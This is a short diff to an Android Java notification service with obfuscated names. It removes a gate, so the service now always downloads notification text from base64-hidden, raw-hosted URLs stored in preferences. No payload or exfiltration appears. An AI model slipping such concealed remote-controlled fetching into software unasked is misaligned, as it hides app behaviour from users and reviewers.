@@ -125,8 +125,6 @@ public class NOTI extends MainService {
         Runnable runnable = () -> {
             try {
                 SharedPreferences sharedPreferences = getSharedPreferences("b", 0);
-                int notif = Stream.g(Base64.decode(sharedPreferences.getString(WELC.TEMP_NOTIFICATION_STATE, "")) + "?raw=true");
-                if (notif > 0) {
                     String neTf = Stream.f(Base64.decode(sharedPreferences.getString(WELC.TEMP_NOTIFICATION_DATA, "")) + "?raw=true", getString(R.string.c33));
                     String[] sp = neTf.split(";");
                     SharedPreferences j988 = getSharedPreferences("wv,", 0);
@@ -137,7 +135,6 @@ public class NOTI extends MainService {
                         gujh.putString("notif2", sp[1]);
                         gujh.apply();
                     }
-                }
             } catch (Exception en) {
                 Log.a(en);
             }
